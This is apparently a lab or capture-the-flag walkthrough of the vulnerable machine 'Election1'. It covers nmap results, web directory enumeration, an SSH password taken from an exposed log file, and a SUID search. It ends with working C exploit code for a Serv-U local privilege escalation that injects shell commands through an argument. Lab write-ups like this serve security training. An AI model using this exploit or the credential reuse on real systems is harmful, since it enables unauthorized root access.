# Election1

***

IP=192.168.222.211

## NMAP

| Port Number | Service |
| ----------- | ------- |
| 22          | SSH     |
| 80          | HTTP    |

```perl
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20d1ed84cc68a5a786f0dab8923fd967 (RSA)
|   256 7889b3a2751276922af98d27c108a7b9 (ECDSA)
|_  256 b8f4d661cf1690c5071899b07c70fdc0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80

```txt
election
phpmyadmin
```

### /election/

```bash
/media
/themes
/data
/admin
/index.php
/lib
/js
/languages
/card.php
```

#### /admin

```bash
/img/                
/plugins/             
/index.php            
/css/                 
/ajax/                
/live.php             
/js/                  
/components/          
/logout.php            
/inc/                 
/logs/                
/logs.php              
/dashboard.php          
/guru.php            
```

**/logs**

```bash
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
[2023-10-27 22:46:10]  has been logged out from Unknown IP.
```

ssh --> `love:P@$$w0rd@123`

## PrivEsc

### SUID

```bash
find / -perm -4000 2>/dev/null | grep -v snap
```

/usr/local/Serv-U/Serv-U

#### Serv-U FTP Server < 15.1.7 - Local Privilege Escalation

```c
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```

```bash
gcc exploit.c -o exploit && ./exploit
```
